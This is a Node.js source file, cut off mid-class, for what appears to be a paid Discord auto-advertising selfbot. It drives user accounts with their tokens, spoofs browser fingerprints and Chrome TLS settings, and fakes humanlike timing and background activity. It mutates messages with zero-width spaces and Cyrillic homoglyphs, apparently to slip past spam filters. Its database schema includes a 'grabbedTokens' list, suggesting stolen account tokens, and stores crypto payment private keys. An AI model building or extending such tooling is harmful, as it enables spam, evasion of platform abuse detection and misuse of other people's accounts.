const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const nacl = require('tweetnacl');
const pako = require('pako');
const { spawn } = require('child_process');
const https = require('https');
const WebSocket = require('ws');
const { Client: DiscordJSClient, GatewayIntentBits } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');

// ═══════════════════════════════════════════════════════════════════════════════
// ENVIRONMENT SETUP
// ═══════════════════════════════════════════════════════════════════════════════
require('dotenv').config();

const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// ═══════════════════════════════════════════════════════════════════════════════
// TOKEN UTILITIES — Auto-detect bot vs user token
// ═══════════════════════════════════════════════════════════════════════════════

function isProbablyBotToken(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return false;
    const first = Buffer.from(parts[0], 'base64').toString('utf8');
    const num = parseInt(first, 10);
    if (num > 400000000000000000n) return true;
    return false;
  } catch(e) {
    return false;
  }
}

async function validateTokenFormat(token) {
  try {
    const res = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': `Bot ${token}`,
        'User-Agent': 'DiscordBot (https://github.com/discord/discord-example-app, 1.0.0)',
        'Accept': '*/*'
      },
      timeout: 10000,
      validateStatus: () => true
    });
    if (res.status === 200 && res.data && res.data.id) {
      return { valid: true, type: 'bot', user: res.data, prefix: 'Bot ' };
    }
  } catch(e) {}

  try {
    const res = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Discord-Locale': 'en-US',
        'Referer': 'https://discord.com/channels/@me'
      },
      timeout: 10000,
      validateStatus: () => true
    });
    if (res.status === 200 && res.data && res.data.id) {
      return { valid: true, type: 'user', user: res.data, prefix: '' };
    }
    if (res.status === 401 || res.status === 403) {
      return { valid: false, type: null, user: null, prefix: null };
    }
  } catch(e) {}

  return { valid: false, type: null, user: null, prefix: null };
}

// ═══════════════════════════════════════════════════════════════════════════════
// HUMANIZED DELAY ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

function paretoSample(alpha = 1.5, xm = 1.0) {
  const u = Math.random();
  return xm / Math.pow(u, 1.0 / alpha);
}

function logNormalSample(mu = 0, sigma = 1.0) {
  const u1 = Math.random();
  const u2 = Math.random();
  const z0 = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2);
  return Math.exp(mu + sigma * z0);
}

function boundedPareto(alpha = 2.5, min = 1000, max = 60000) {
  const u = Math.random();
  const minPow = Math.pow(min, alpha);
  const maxPow = Math.pow(max, alpha);
  const x = Math.pow(minPow + u * (maxPow - minPow), 1.0 / alpha);
  return Math.round(Math.min(max, Math.max(min, x)));
}

function circadianMultiplier() {
  const hour = new Date().getHours();
  if (hour >= 1 && hour <= 6) return 1.05 + Math.random() * 0.1;
  if (hour >= 7 && hour <= 9) return 0.95 + Math.random() * 0.1;
  if (hour >= 10 && hour <= 22) return 0.9 + Math.random() * 0.1;
  return 0.95 + Math.random() * 0.1;
}

function contextSwitchJitter(baseMs) {
  if (Math.random() < 0.05) {
    const switchMs = 500 + boundedPareto(2.0, 500, 1500);
    return baseMs + switchMs;
  }
  return baseMs;
}

function calculateDelay(baseDelayMs) {
  if (!baseDelayMs || baseDelayMs < 1000) baseDelayMs = 5000;
  const variation = baseDelayMs * 0.2;
  const min = baseDelayMs - variation;
  const max = baseDelayMs + variation;
  let delay = boundedPareto(3.0, min, max);
  delay *= circadianMultiplier();
  delay = contextSwitchJitter(delay);
  delay += (Math.random() - 0.5) * 80;
  return Math.round(Math.min(max * 1.15, Math.max(min * 0.85, delay)));
}

function autoReplyDelay() {
  const min = 10000;
  const max = 25000;
  let delay = boundedPareto(2.5, min, max);
  delay *= circadianMultiplier();
  delay = contextSwitchJitter(delay);
  return Math.round(Math.min(max, Math.max(min, delay)));
}

// ═══════════════════════════════════════════════════════════════════════════════
// MESSAGE VARIATION ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

const SPINTAX_RE = /\{([^}]+)\}/g;

function expandSpintax(text) {
  if (!text || !SPINTAX_RE.test(text)) return text;
  SPINTAX_RE.lastIndex = 0;
  let iterations = 0;
  let result = text;
  while (SPINTAX_RE.test(result) && iterations < 50) {
    SPINTAX_RE.lastIndex = 0;
    result = result.replace(SPINTAX_RE, (_, choices) => {
      const opts = choices.split('|').map(s => s.trim()).filter(Boolean);
      return opts.length > 0 ? opts[Math.floor(Math.random() * opts.length)] : '';
    });
    iterations++;
  }
  return result;
}

function mutateMessage(text) {
  if (!text) return text;
  const mutators = [
    (s) => Math.random() < 0.25 ? s + (Math.random() < 0.5 ? ' ' : '') : s,
    (s) => Math.random() < 0.15 ? s.replace(/ /g, () => Math.random() < 0.05 ? '\u200B ' : ' ') : s,
    (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
    (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
  ];
  let result = text;
  const count = Math.floor(Math.random() * 3);
  const shuffled = mutators.sort(() => Math.random() - 0.5);
  for (let i = 0; i < count; i++) {
    result = shuffled[i](result);
  }
  return result;
}

function varyMessage(text) {
  const expanded = expandSpintax(text);
  return mutateMessage(expanded);
}

function weightedRandom(items, weights) {
  const w = weights || items.map(() => 1);
  const total = w.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < items.length; i++) {
    r -= w[i];
    if (r <= 0) return items[i];
  }
  return items[items.length - 1];
}

// ═══════════════════════════════════════════════════════════════════════════════
// ACCOUNT FINGERPRINTING
// ═══════════════════════════════════════════════════════════════════════════════

const _accountProfiles = new Map();

function _getAccountProfile(token) {
  const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
  if (!_accountProfiles.has(hash)) {
    const screens = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
    const screen = screens[Math.floor(Math.random() * screens.length)];
    const mems = [2,4,8,16];
    const concurrencies = [2,4,8,16];
    const browsers = [
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '134.0.0.0' },
      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '135.0' },
      { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1', browser: 'Mobile Safari', os: 'iOS', osv: '18.1', bv: '18.1' },
      { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36', browser: 'Chrome', os: 'Android', osv: '15', bv: '135.0.0.0' },
    ];
    const b = browsers[Math.floor(Math.random() * browsers.length)];
    _accountProfiles.set(hash, {
      ua: b.ua, browser: b.browser, os: b.os, osv: b.osv, bv: b.bv,
      sw: screen[0], sh: screen[1], dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
      cd: 24, mem: mems[Math.floor(Math.random() * mems.length)],
      hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
      arch: 'x64', build: 438286,
      locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
    });
  }
  return _accountProfiles.get(hash);
}

const _fp = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
];
const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];

function generateXSuperProperties(token) {
  const p = _getAccountProfile(token);
  const props = {
    os: p.os, browser: p.browser, device: '', system_locale: p.locale,
    browser_user_agent: p.ua, browser_version: p.bv, os_version: p.osv,
    referrer: '', referring_domain: '', referrer_current: '', referring_domain_current: '',
    release_channel: 'stable', client_build_number: p.build, client_event_source: null, design_id: 0,
  };
  return Buffer.from(JSON.stringify(props)).toString('base64');
}

// ═══════════════════════════════════════════════════════════════════════════════
// TLS & NETWORK CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════════

function getChromeTLSOptions(forWebSocket = false) {
  return {
    ciphers: [
      'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256','ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305','ECDHE-RSA-CHACHA20-POLY1305',
      'ECDHE-RSA-AES128-SHA','ECDHE-RSA-AES256-SHA',
      'AES128-GCM-SHA256','AES256-GCM-SHA384','AES128-SHA','AES256-SHA',
    ].join(':'),
    minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
    ALPNProtocols: ['http/1.1'],
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    ecdhCurve: 'X25519:P-256:P-384',
    honorCipherOrder: false,
  };
}

function createSharedAgent(forWebSocket = false) {
  return new https.Agent({
    ...getChromeTLSOptions(forWebSocket),
    keepAlive: true, keepAliveMsecs: 30000,
    maxSockets: 6, maxFreeSockets: 3,
    scheduling: 'lifo', timeout: 30000,
  });
}

const _sharedAgent = createSharedAgent(false);

const _axiosInstance = axios.create({
  timeout: 15000,
  headers: { 'Connection': 'keep-alive' },
  httpsAgent: _sharedAgent,
  validateStatus: () => true,
});

const { createHash } = crypto;

function getKeypair(token) {
  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
}

function signPayload(payload, secretKey) {
  const message = Buffer.from(JSON.stringify(payload));
  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
}

function encryptSecretBox(message, key) {
  const nonce = nacl.randomBytes(24);
  const msgBytes = message instanceof Buffer ? new Uint8Array(message) : new Uint8Array(Buffer.from(message, 'utf8'));
  const keyBytes = key instanceof Buffer ? new Uint8Array(key) : new Uint8Array(key);
  const box = nacl.secretbox(msgBytes, nonce, keyBytes);
  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
}

function decryptSecretBox(nonce, ciphertext, key) {
  const opened = nacl.secretbox.open(
    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
    key instanceof Uint8Array ? key : new Uint8Array(key)
  );
  return opened ? Buffer.from(opened) : null;
}

function generateKey() {
  return Buffer.from(nacl.randomBytes(32));
}

function compressData(data, level = 6) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.deflate(input, { level }));
}

function decompressData(data) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.inflate(input));
}

function isCompressed(data) {
  if (!data || data.length < 2) return false;
  return (data[0] === 0x78 && (data[1] === 0x9C || data[1] === 0xDA || data[1] === 0x01));
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISCORD API CLIENT — Rate-limited REST client
// ═══════════════════════════════════════════════════════════════════════════════

class DiscordApiClient {
  constructor(token, tokenType = 'user') {
    this.token = token;
    this.tokenType = tokenType;
    this.authHeader = tokenType === 'bot' ? `Bot ${token}` : token;
    this.fp = _rfp(token);
    this.superProps = generateXSuperProperties(token);
    this.keypair = getKeypair(token);
    this.globalRateLimitReset = 0;
    this._rotationTimer = setInterval(() => this.rotateFingerprint(), (20 * 60 * 1000) + Math.floor(Math.random() * 10 * 60 * 1000));
  }

  rotateFingerprint() {
    if (Math.random() < 0.15) {
      const hash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
      _accountProfiles.delete(hash);
    }
    this.fp = _rfp(this.token);
    this.superProps = generateXSuperProperties(this.token);
  }

  _headers(extra = {}) {
    const base = {
      'Authorization': this.authHeader,
      'User-Agent': this.fp,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Discord-Locale': 'en-US',
      'X-Super-Properties': this.superProps,
      'Referer': 'https://discord.com/channels/@me',
    };
    const ordered = {};
    const order = ['Authorization','User-Agent','Accept','Accept-Language','X-Discord-Locale','X-Super-Properties','Referer'];
    for (const k of order) if (base[k] !== undefined) ordered[k] = base[k];
    for (const [k, v] of Object.entries(extra)) ordered[k] = v;
    return ordered;
  }

  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
    const url = `https://discord.com/api/v10${endpoint}`;
    let attempts = 0;
    const maxAttempts = 3;

    while (attempts < maxAttempts) {
      const globalWait = this.globalRateLimitReset - Date.now();
      if (globalWait > 0) {
        await new Promise(r => setTimeout(r, globalWait));
      }

      try {
        const config = {
          method: method.toUpperCase(),
          url: url,
          headers: this._headers(extraHeaders),
          timeout: 20000,
          responseType: 'arraybuffer',
        };
        if (body !== null) {
          config.data = body;
          if (!(body instanceof Buffer) && typeof body === 'object' && !extraHeaders['Content-Type']) {
            config.headers['Content-Type'] = 'application/json';
          }
        }
        const res = await _axiosInstance(config);
        const status = res.status;
        const responseBody = Buffer.from(res.data);
        let parsedData = null;
        try { parsedData = JSON.parse(responseBody.toString()); } catch(e) {}

        if (status === 429) {
          const isGlobal = res.headers['x-ratelimit-global'] === 'true';
          const retryAfter = parseFloat(res.headers['retry-after'] || 5) * 1000;
          if (isGlobal) this.globalRateLimitReset = Date.now() + retryAfter;
          await new Promise(r => setTimeout(r, retryAfter * 1.1));
          attempts++;
          continue;
        }
        if (status >= 400) {
          const err = new Error(`Discord API ${method} ${endpoint} failed: ${status}`);
          err.status = status;
          err.data = parsedData;
          throw err;
        }
        return parsedData;
      } catch (err) {
        if (err.status && err.data) throw err;
        if (attempts < maxAttempts - 1) {
          await new Promise(r => setTimeout(r, 2000 * (attempts + 1)));
          attempts++;
          continue;
        }
        throw err;
      }
    }
    throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
  }

  destroy() {
    if (this._rotationTimer) clearInterval(this._rotationTimer);
  }
}

const OWNER_ID = process.env.OWNER_ID || '1482736115143282941';
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';


// ═══════════════════════════════════════════════════════════════════════════════
// STEALTH CLIENT — discord.js for bots, discord.js-selfbot-v13 for user tokens
// ═══════════════════════════════════════════════════════════════════════════════

class StealthClient {
  constructor(token) {
    this.token = token;
    this.tokenType = null;
    this.authPrefix = '';
    this.client = null;
    this.api = null;
    this.repliedUsers = this._loadRepliedUsers();
    this.encryptionKey = null;
    this.ready = false;
    this.handlers = {};
    this._dmCooldowns = new Map();
    this._channelPermissions = new Map();
    this._channelRateLimits = new Map();
    this._explicitlyStopped = false;
    this._currentChannelId = null;
    this._backgroundTimers = [];
    this._tokenValidated = false;
    this._tokenValid = false;
    this._validatedUser = null;
    this.pendingReplies = new Set();
    this._autoReplyState = new Map();
    this.user = null;
  }

  _loadRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
    } catch(e) {}
    return new Set();
  }

  _saveRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
    } catch(e) {}
  }

  async _validateTokenWithCache() {
    if (this._tokenValidated) return { valid: this._tokenValid, user: this._validatedUser };
    await new Promise(r => setTimeout(r, 300 + Math.floor(Math.random() * 700)));
    const result = await validateTokenFormat(this.token);
    if (result.valid) {
      this._tokenValid = true; this._validatedUser = result.user;
      this.tokenType = result.type; this.authPrefix = result.prefix; this._tokenValidated = true;
      return { valid: true, user: result.user, type: result.type };
    }
    await new Promise(r => setTimeout(r, 1000));
    const retry = await validateTokenFormat(this.token);
    if (retry.valid) {
      this._tokenValid = true; this._validatedUser = retry.user;
      this.tokenType = retry.type; this.authPrefix = retry.prefix; this._tokenValidated = true;
      return { valid: true, user: retry.user, type: retry.type };
    }
    this._tokenValid = false; this._tokenValidated = true;
    return { valid: false, user: null };
  }

  async connect() {
    const validation = await this._validateTokenWithCache();
    if (!validation.valid) throw new Error('Invalid token - check your token and try again');

    this.user = validation.user;
    this.tokenType = validation.type || this.tokenType;
    this.api = new DiscordApiClient(this.token, this.tokenType);

    if (this.tokenType === 'bot') {
      this.client = new DiscordJSClient({
        intents: [
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMessages,
          GatewayIntentBits.DirectMessages,
          GatewayIntentBits.MessageContent,
        ]
      });
      return new Promise((resolve, reject) => {
        const CONNECT_TIMEOUT = 60000;
        let timeoutTimer = setTimeout(() => {
          try { this.client.destroy(); } catch(e) {}
          reject(new Error('Connection timed out - please try again'));
        }, CONNECT_TIMEOUT);

        this.client.once('ready', () => {
          this.ready = true;
          clearTimeout(timeoutTimer);
          this.emit('READY', { user: this.client.user });
          this._startBackgroundEvents();
          resolve();
        });
        this.client.on('messageCreate', (msg) => {
          if (this.ready && !this._explicitlyStopped) this.emit('messageCreate', msg);
        });
        this.client.login(this.token).catch(err => {
          clearTimeout(timeoutTimer);
          reject(new Error(`Login failed (${err?.message || 'unknown'}) - check your token`));
        });
      });
    } else {
      // Use discord.js-selfbot-v13 for user tokens
      this.client = new SelfbotClient({
        checkUpdate: false,
      });

      return new Promise((resolve, reject) => {
        const CONNECT_TIMEOUT = 60000;
        let timeoutTimer = setTimeout(() => {
          try { this.client.destroy(); } catch(e) {}
          reject(new Error('Connection timed out - please try again'));
        }, CONNECT_TIMEOUT);

        this.client.once('ready', () => {
          this.ready = true;
          clearTimeout(timeoutTimer);
          // Normalize user object to match bot format
          this.user = this.user || {
            id: this.client.user.id,
            username: this.client.user.username,
            discriminator: this.client.user.discriminator,
            avatar: this.client.user.avatar,
            bot: false
          };
          this.emit('READY', { user: this.client.user });
          this._startBackgroundEvents();
          resolve();
        });

        this.client.on('messageCreate', (msg) => {
          if (this.ready && !this._explicitlyStopped) {
            // Normalize message shape to match discord.js
            const normalized = this._normalizeSelfbotMessage(msg);
            this.emit('messageCreate', normalized);
          }
        });

        this.client.on('error', (err) => {
          console.error('[Selfbot] Client error:', err.message);
        });

        this.client.login(this.token).catch(err => {
          clearTimeout(timeoutTimer);
          reject(new Error(`Selfbot login failed (${err?.message || 'unknown'}) - check your token`));
        });
      });
    }
  }

  _normalizeSelfbotMessage(msg) {
    // discord.js-selfbot-v13 message shape is similar to discord.js v13
    // but we normalize to ensure consistent handling
    return {
      id: msg.id,
      content: msg.content || '',
      author: {
        id: msg.author?.id,
        username: msg.author?.username,
        discriminator: msg.author?.discriminator,
        bot: msg.author?.bot || false
      },
      channelId: msg.channelId || msg.channel?.id,
      guildId: msg.guildId || msg.guild?.id || null,
      createdTimestamp: msg.createdTimestamp || Date.now(),
      channel: msg.channel ? {
        id: msg.channel.id,
        send: async (content) => {
          return msg.channel.send(content);
        }
      } : null,
      reply: async (content) => {
        return msg.channel?.send(content);
      }
    };
  }

  _startBackgroundEvents() {
    this._stopBackgroundEvents();

    if (this.tokenType === 'user') {
      const schedulePresence = () => {
        const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
        const timer = setTimeout(() => {
          if (!this.ready || this._explicitlyStopped) return;
          // selfbot-v13 handles presence via client.user.setActivity etc.
          schedulePresence();
        }, delay);
        this._backgroundTimers.push(timer);
      };
      schedulePresence();
    }

    const scheduleTelemetry = () => {
      const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
      const timer = setTimeout(() => {
        if (!this.ready || this._explicitlyStopped) return;
        if (Math.random() < 0.3) this.api.request('/users/@me', 'GET').catch(() => {});
        scheduleTelemetry();
      }, delay);
      this._backgroundTimers.push(timer);
    };
    scheduleTelemetry();

    const scheduleReadState = () => {
      const delay = boundedPareto(2.5, 2 * 60 * 1000, 5 * 60 * 1000);
      const timer = setTimeout(() => {
        if (!this.ready || this._explicitlyStopped) return;
        if (Math.random() < 0.2) this.api.request('/users/@me', 'GET').catch(() => {});
        scheduleReadState();
      }, delay);
      this._backgroundTimers.push(timer);
    };
    scheduleReadState();
  }

  _stopBackgroundEvents() {
    for (const timer of this._backgroundTimers) clearTimeout(timer);
    this._backgroundTimers = [];
  }

  async checkChannelPermission(channelId) {
    if (this._channelPermissions.has(channelId)) return this._channelPermissions.get(channelId);
    try {
      if (this.tokenType === 'bot' && this.client && this.client.channels) {
        const channel = await this.client.channels.fetch(channelId);
        if (!channel || typeof channel.send !== 'function') {
          this._channelPermissions.set(channelId, false);
          return false;
        }
        this._channelPermissions.set(channelId, true);
        return true;
      }
      const channel = await this.api.request(`/channels/${channelId}`, 'GET');
      if (!channel || !channel.id) {
        this._channelPermissions.set(channelId, false);
        return false;
      }
      this._channelPermissions.set(channelId, true);
      return true;
    } catch (err) {
      const discordCode = err.data?.code || err.code;
      if (err.status === 403 || err.status === 401 || err.status === 404 || discordCode === 10003 || discordCode === 50001 || discordCode === 50013) {
        this._channelPermissions.set(channelId, false);
        return false;
      }
      console.error(`[ChannelCheck] Transient error for ${channelId}:`, err.message);
      return null;
    }
  }

  async navigateToChannel(channelId) {
    if (this._currentChannelId === channelId) {
      await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
      return;
    }
    const switchDelay = Math.round(logNormalSample(6.0, 0.4));
    await new Promise(r => setTimeout(r, Math.min(1200, Math.max(200, switchDelay))));
    const readDelay = Math.round(logNormalSample(5.5, 0.4));
    await new Promise(r => setTimeout(r, Math.min(1000, Math.max(150, readDelay))));
    this._currentChannelId = channelId;
  }

  async sendMessage(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
      console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
      return false;
    }
    await this.navigateToChannel(channelId);
    const now = Date.now();
    const freeAt = this._channelRateLimits.get(channelId) || 0;
    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
    const variedContent = varyMessage(content);
    if (this.tokenType === 'bot' && this.client && this.client.channels) {
      try {
        const channel = await this.client.channels.fetch(channelId);
        if (channel && typeof channel.send === 'function') {
          const files = (attachments || []).map(att => ({ attachment: att.buffer, name: att.name }));
          await channel.send({ content: variedContent, files });
          return true;
        }
      } catch(e) {}
    }
    return this.sendMessageDirect(channelId, variedContent, attachments);
  }

  async sendMessageFast(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;
    const now = Date.now();
    const freeAt = this._channelRateLimits.get(channelId) || 0;
    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
    const variedContent = varyMessage(content);
    return this.sendMessageDirect(channelId, variedContent, attachments);
  }

  async sendMessageDirect(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;
    const now = Date.now();
    const freeAt = this._channelRateLimits.get(channelId) || 0;
    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
    try {
      if (attachments && attachments.length > 0) {
        const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
        const chunks = [];
        const body = { content };
        chunks.push(Buffer.from(`--${boundary}\r\n`));
        chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
        chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
        chunks.push(Buffer.from(JSON.stringify(body)));
        chunks.push(Buffer.from(`\r\n`));
        for (let i = 0; i < attachments.length; i++) {
          const att = attachments[i];
          chunks.push(Buffer.from(`--${boundary}\r\n`));
          chunks.push(Buffer.from(`Content-Disposition: form-data; name="files[${i}]"; filename="${att.name}"\r\n`));
          chunks.push(Buffer.from(`Content-Type: application/octet-stream\r\n\r\n`));
          chunks.push(att.buffer);
          chunks.push(Buffer.from(`\r\n`));
        }
        chunks.push(Buffer.from(`--${boundary}--\r\n`));
        const multipartBody = Buffer.concat(chunks);
        await this.api.request(`/channels/${channelId}/messages`, 'POST', multipartBody, {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        });
      } else {
        await this.api.request(`/channels/${channelId}/messages`, 'POST', { content });
      }
      this._channelRateLimits.set(channelId, Date.now() + 750);
      return true;
    } catch (err) {
      if (err.status === 429) {
        const rawRetry = err.data?.retry_after || (err.data && err.data.retryAfter) || 5;
        const retryAfter = parseFloat(rawRetry) < 1000 ? parseFloat(rawRetry) * 1000 : parseFloat(rawRetry);
        this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
        console.error(`[SendDirect] ${channelId}: Rate limited, retry after ${retryAfter}ms`);
      }
      const discordCode = err.data?.code || err.code;
      if (err.status === 403 || err.status === 401 || err.status === 404 || discordCode === 50001 || discordCode === 50013 || discordCode === 10003) {
        this._channelPermissions.set(channelId, false);
      }
      if (err.status === 400) console.error(`[SendDirect] ${channelId}: Bad request — ${JSON.stringify(err.data)}`);
      return false;
    }
  }

  async joinGuild(inviteCode) {
    try {
      const res = await this.api.request(`/invites/${inviteCode}`, 'POST', {});
      return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message || 'Unknown error' };
    } catch (err) {
      return { success: false, error: err.message || 'Failed to join guild' };
    }
  }

  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }

  destroy() {
    this._explicitlyStopped = true;
    this.ready = false;
    this._stopBackgroundEvents();
    try { if (this.client) this.client.destroy(); } catch(e) {}
    this._saveRepliedUsers();
    if (this.api) this.api.destroy();
  }
}


// ═══════════════════════════════════════════════════════════════════════════════
// SIMPLE DATABASE
// ═══════════════════════════════════════════════════════════════════════════════

class SimpleDB {
  constructor() {
    this.file = path.join(dataDir, 'db.json');
    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.file)) {
        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
      }
    } catch(e) {}
  }

  save() {
    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) {}
  }

  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }

  addPending(userId, address, privateKey, expectedUSD, index) {
    this.markAddressUsed(address);
    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
    this.save();
    return this.data.pending[address];
  }

  getPending(address) { return this.data.pending[address]; }
  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
